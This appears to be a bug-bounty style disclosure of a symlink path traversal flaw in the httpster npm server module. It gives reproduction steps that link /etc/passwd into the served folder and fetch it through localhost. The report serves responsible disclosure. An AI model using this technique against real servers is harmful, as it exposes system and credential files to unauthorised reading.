I would like to report path traversal vulnerability in httpster module
It allows an attacker to read system files via path traversal vulnerability

Module
-------------------------------------------
module name: httpster
version: 1.0.5(latest)
npm page: https://www.npmjs.com/package/httpster

Module Description

Simple http server for quick loading of content.

Weekly Downloads
------------------------------------------------
9,164
Vulnerability

Vulnerability Description

With a symbolically linked file in the working directory, it is possible to read arbitrary files outside of the web root directory.

Steps To Reproduce:
--------------------------------------------------

1) Install the httpster module
$ npm -g install httpster

2)Make a directory
$ mkdir test

3)Go to 'test' directory
$ cd test

4)create a symlink file
ln -s /etc/passwd 'filename'

5)Run httpster module
$ httpster

6)Request the file within browser
http://localhost:3333/'filename'


Supporting Material/References:
--------------------------------------------------------------------------------------

These are similar reports
https://hackerone.com/reports/510043
https://hackerone.com/reports/695416

[OPERATING SYSTEM VERSION] Ubuntu 18.04.3 LTS
[NODEJS VERSION] v8.10.0
[NPM VERSION] 3.5.2
[BROWSER] Mozilla Firefox 72.0.1 (64-bit)



Impact
----------------------------------------------------------------------
This could have enabled an attacker to view system files and leverage attacks like remote code execution and so on
